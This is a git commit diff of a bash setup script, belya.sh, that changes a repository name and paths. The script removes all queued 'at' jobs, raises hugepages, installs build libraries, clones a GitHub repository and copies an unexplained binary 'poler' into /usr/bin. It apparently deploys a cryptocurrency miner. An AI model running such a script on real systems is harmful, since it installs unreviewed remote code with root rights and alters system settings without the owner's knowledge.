fd5a705dc67aa06fcf7df7361311a51a8d19dfb0
robbertopp1 <45674442+robbertopp1@users.noreply.github.com>
2019-09-29 03:44:19 +0530

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/my1/
+rm -rf /tmp/thebest/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir my1
-git clone https://github.com/not100today/my1.git /tmp/my1
-cd /tmp/my1
-chmod +x /tmp/my1/poler
+cd /tmp && mkdir thebest
+git clone https://github.com/robbertopp1/thebest.git /tmp/thebest
+cd /tmp/thebest
+chmod +x /tmp/thebest/poler
 chmod 777 ./*.sh
-cp /tmp/my1/poler /usr/bin/
+cp /tmp/thebest/poler /usr/bin/
 
 sudo apt-get install dos2unix
 sudo dos2unix time1.sh
